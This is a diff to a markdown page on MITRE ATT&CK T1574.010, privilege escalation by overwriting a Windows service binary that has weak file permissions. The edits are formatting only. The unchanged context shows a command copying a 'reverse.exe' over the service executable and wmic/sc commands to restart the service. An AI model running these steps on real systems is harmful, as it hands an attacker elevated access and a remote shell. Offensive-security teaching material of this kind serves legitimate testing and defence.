@@ -1,5 +1,7 @@
 ---
-description: MITRE ATT&CK™ Hijack Execution Flow - Services File Permissions Weakness - Technique T1574.010
+description: >-
+  MITRE ATT&CK™ Hijack Execution Flow - Services File Permissions Weakness -
+  Technique T1574.010
 ---
 
 # Weak File Permissions
@@ -46,7 +48,9 @@ We just have to replace the binary.
 ```powershell
 copy /y c:\Temp\reverse.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
 ```
+
 And then, restart the service
+
 ```powershell
 #Using wmic
 wmic service <Service_Name> call stopservice
@@ -62,6 +66,6 @@ sc start <Service_Name>
 {% endtab %}
 {% endtabs %}
 
-## References
+## Resources
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services" %}
